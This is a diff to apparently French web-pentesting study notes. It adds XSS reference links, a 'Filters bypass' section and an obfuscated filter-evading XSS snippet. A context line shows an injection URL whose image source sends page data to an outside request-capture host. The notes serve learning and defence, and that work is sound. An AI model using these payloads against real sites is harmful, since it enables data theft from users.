@@ -55,6 +55,8 @@ Accéder
 
 - [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
+- [OWASP Cheatsheet Series][https://cheatsheetseries.owasp.org/index.html)
+
 - [Hacktricks](https://book.hacktricks.xyz/welcome/readme), [Hacktricks - Bypass 403](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)
 
 - [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)
@@ -175,14 +177,19 @@ Voir aussi `elements`
 
 ### XSS
 
+ - https://liveoverflow.com/do-not-use-alert-1-in-xss/
  - https://beta.hackndo.com/attaque-xss/
  - https://excess-xss.com/
  - https://learn-cyber.net/article/Self-XSS-Attacks
  - https://learn-cyber.net/article/Reflected-XSS-Attacks
 
+#### Filters bypass
+
  - https://javascript.info/script-async-defer
  - https://github.com/payloadbox/xss-payload-list
  - https://github.com/cure53/HTTPLeaks/tree/main
+ - https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code
+ - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads
 
 `Protection`: HTML-encode les entrées utilisateurs, CSP
 
@@ -211,6 +218,12 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 - https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
 - https://www.cobalt.io/blog/csp-and-bypasses
 - https://chromestatus.com/feature/5735596811091968
+
+rappel
+
+```js
+alert(window["docu"+"ment"]["title"])
+```
 
 Analyser les tags CSP (conserver journal,désactiver cache)
 
